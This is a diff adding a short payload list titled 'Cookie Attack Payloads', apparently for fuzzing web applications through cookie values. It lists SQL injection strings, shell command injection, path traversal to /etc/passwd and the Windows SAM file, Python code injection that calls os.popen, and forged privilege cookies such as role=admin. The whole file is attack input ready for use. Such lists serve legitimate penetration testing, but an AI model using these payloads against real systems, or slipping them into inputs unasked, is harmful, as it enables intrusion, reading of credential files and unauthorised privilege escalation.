@@ -1,0 +1,31 @@
+# Cookie Attack Payloads
+
+# SQL Injection in cookies
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1
+admin'--
+1' ORDER BY 1--
+1' UNION SELECT null--
+
+# Command Injection
+; ls
+| ls
+`ls`
+$(ls)
+
+# Path Traversal
+../../../etc/passwd
+..\..\..\..\windows\system32\config\sam
+
+# Python Code Injection
+eval(compile('for x in range(1):\n import time\n time.sleep(5)','a','single'))
+__import__('os').popen('id').read()
+
+# Privilege escalation cookie values
+admin=1
+admin=true
+role=admin
+isAdmin=true
+user_type=administrator
+access_level=admin
